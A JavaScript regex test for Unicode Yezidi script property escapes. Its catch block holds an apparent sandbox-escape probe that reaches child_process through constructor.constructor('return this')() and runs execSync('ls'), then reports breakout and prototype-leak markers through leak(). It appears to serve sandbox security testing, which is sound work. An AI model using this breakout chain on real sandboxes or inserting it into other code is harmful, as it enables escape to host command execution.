try {
    const matchSymbols = buildString({
        loneCodePoints: [
            1548,
            1563,
            1567
        ],
        ranges: [
            [
                1632,
                1641
            ],
            [
                69248,
                69289
            ],
            [
                69291,
                69293
            ],
            [
                69296,
                69297
            ]
        ]
    });
    testPropertyEscapes(/^\p{Script_Extensions=Yezidi}+$/u, matchSymbols, '\\p{Script_Extensions=Yezidi}');
    testPropertyEscapes(/^\p{Script_Extensions=Yezi}+$/u, matchSymbols, '\\p{Script_Extensions=Yezi}');
    testPropertyEscapes(/^\p{scx=Yezidi}+$/u, matchSymbols, '\\p{scx=Yezidi}');
    testPropertyEscapes(/^\p{scx=Yezi}+$/u, matchSymbols, '\\p{scx=Yezi}');
    const nonMatchSymbols = buildString({
        loneCodePoints: [69290],
        ranges: [
            [
                56320,
                57343
            ],
            [
                0,
                1547
            ],
            [
                1549,
                1562
            ],
            [
                1564,
                1566
            ],
            [
                1568,
                1631
            ],
            [
                1642,
                56319
            ],
            [
                57344,
                69247
            ],
            [
                69294,
                69295
            ],
            [
                69298,
                1114111
            ]
        ]
    });
    testPropertyEscapes(/^\P{Script_Extensions=Yezidi}+$/u, nonMatchSymbols, '\\P{Script_Extensions=Yezidi}');
    testPropertyEscapes(/^\P{Script_Extensions=Yezi}+$/u, nonMatchSymbols, '\\P{Script_Extensions=Yezi}');
    testPropertyEscapes(/^\P{scx=Yezidi}+$/u, nonMatchSymbols, '\\P{scx=Yezidi}');
    testPropertyEscapes(/^\P{scx=Yezi}+$/u, nonMatchSymbols, '\\P{scx=Yezi}');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}